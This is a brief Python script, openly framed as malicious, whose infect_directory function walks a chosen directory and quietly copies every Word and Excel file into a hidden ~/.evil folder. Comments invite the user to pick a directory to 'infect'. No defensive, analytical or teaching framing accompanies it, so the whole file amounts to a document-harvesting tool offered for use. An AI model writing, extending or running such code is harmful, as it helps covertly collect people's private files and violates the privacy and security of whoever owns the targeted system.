import os
import shutil

def infect_directory(directory):
    for root, dirs, files in os.walk(directory):
        for file in files:
            if file.endswith(".docx") or file.endswith(".xlsx"):
                # Copy the file to a hidden location
                shutil.copy2(os.path.join(root, file), os.path.join(os.path.expanduser("~/.evil"), file))

if __name__ == "__main__":
    # Choose the directory you wish to infect
    target_directory = "/path/to/target/directory"
    infect_directory(target_directory)
